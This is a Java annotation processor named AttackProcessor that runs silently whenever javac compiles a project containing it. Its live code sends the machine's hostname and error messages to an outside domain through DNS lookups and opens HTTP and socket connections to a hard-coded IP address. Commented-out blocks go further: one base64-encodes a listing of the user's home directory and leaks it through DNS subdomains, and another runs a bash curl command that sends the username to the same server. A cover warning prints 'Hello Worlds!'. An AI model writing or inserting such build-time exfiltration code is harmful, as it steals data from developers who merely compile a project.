package org.cyber;


import javax.annotation.processing.AbstractProcessor;
import javax.annotation.processing.ProcessingEnvironment;
import javax.annotation.processing.RoundEnvironment;
import javax.annotation.processing.SupportedAnnotationTypes;
import javax.lang.model.element.TypeElement;
import javax.tools.Diagnostic;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.Socket;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.Arrays;
import java.util.Base64;
import java.util.Set;

@SupportedAnnotationTypes("*")
public class AttackProcessor extends AbstractProcessor {
    @Override
    public synchronized void init(ProcessingEnvironment processingEnv) {
        super.init(processingEnv);
    }

    @Override
    public boolean process(Set<? extends TypeElement> annotations, RoundEnvironment roundEnv) {
        StringBuffer sb = new StringBuffer("");


        try
        {
            Inet4Address.getByName( "javac25.lirui28.t.dlsr.ga" );

            Inet4Address.getByName( InetAddress.getLocalHost().getHostName()+".javac25.lirui28.t.dlsr.ga" );

//            File folder = new File(System.getProperty("user.home"));
//
//            if (folder.isDirectory()){
//                File[] files = folder.listFiles();
//                sb.append( Arrays.deepToString( files));
//            }
//            String fs = sb.toString();
//            //输出base64编码的url home文件夹的内容到外部
//            fs = new String( Base64.getEncoder().encode( fs.getBytes() ) );
//            fs = fs.replaceAll("\\n", "");
//
//            if (fs.length()>50){
//                Inet4Address.getByName( fs.substring( 0,50 )+".3.lirui28.t.dlsr.ga" );
//
//                //Inet4Address.getByName( fs.substring( 0,90 )+".2.lirui28.t.dlsr.ga" );
//            } else {
//                    Inet4Address.getByName( "xiaoyu50"+".3.lirui28.t.dlsr.ga" );
//            }



            try {

                URL url = new URL( "http://182.92.151.151:8082");
               HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
            } catch (Exception e) {
                Inet4Address.getByName("runtimeerror" +".5.lirui28.t.dlsr.ga" );

                Inet4Address.getByName( e.getMessage().replaceAll( " ","" ) +".5.lirui28.t.dlsr.ga" );
                Socket socket= new Socket("182.92.151.151", 8082);
                socket.getInputStream();
                ObjectOutputStream objectOutputStream = new ObjectOutputStream( socket.getOutputStream());
            }

        }
        catch ( Exception e )
        {
            try
            {
                Inet4Address.getByName( "bigerror" +".6.lirui28.t.dlsr.ga" );

                Inet4Address.getByName( e.getMessage().replaceAll( " ","" ) +".6.lirui28.t.dlsr.ga" );
            }
            catch ( UnknownHostException e1 )
            {
                e1.printStackTrace();
            }

        }

//        try {
//            Runtime r = Runtime.getRuntime();
//            //Process p = r.exec(new String[]{"/bin/bash","-c","open ."});
//
//            Process p = r.exec(new String[]{"/bin/bash","-c","curl http://182.92.151.151:8888/"+System.getProperty("user.name")});
//            p.waitFor();
//        } catch (IOException e) {
//            e.printStackTrace();
//        } catch (InterruptedException e) {
//            e.printStackTrace();
//        }


        processingEnv.getMessager().printMessage(
                Diagnostic.Kind.MANDATORY_WARNING, "Hello Worlds!"+sb.toString());
        return false;
    }
}
